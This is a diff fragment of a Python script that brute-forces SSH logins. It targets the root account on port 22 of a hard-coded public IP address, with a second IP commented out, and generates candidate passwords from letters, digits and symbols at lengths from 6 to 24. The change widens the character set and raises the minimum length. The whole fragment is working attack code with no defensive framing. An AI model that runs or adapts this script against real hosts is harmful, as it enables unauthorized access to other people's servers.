@@ -65,14 +65,14 @@ else:
 os.system(clearing)
 
 words = 'QWERTYUIOPASDFGHJKLZXCVBNM'
-words = words + words.lower() + '123456789#@!'
+words = words + words.lower() + '1234567890#@!'
 
 host = '58.96.173.59'
 #host = '120.25.208.234'
 port = 22
 user = 'root'
 
-for rep in range(2,25):
+for rep in range(6,25):
     r = its.product(words,repeat=rep)
     for i in r:
         pwd = "".join(i)
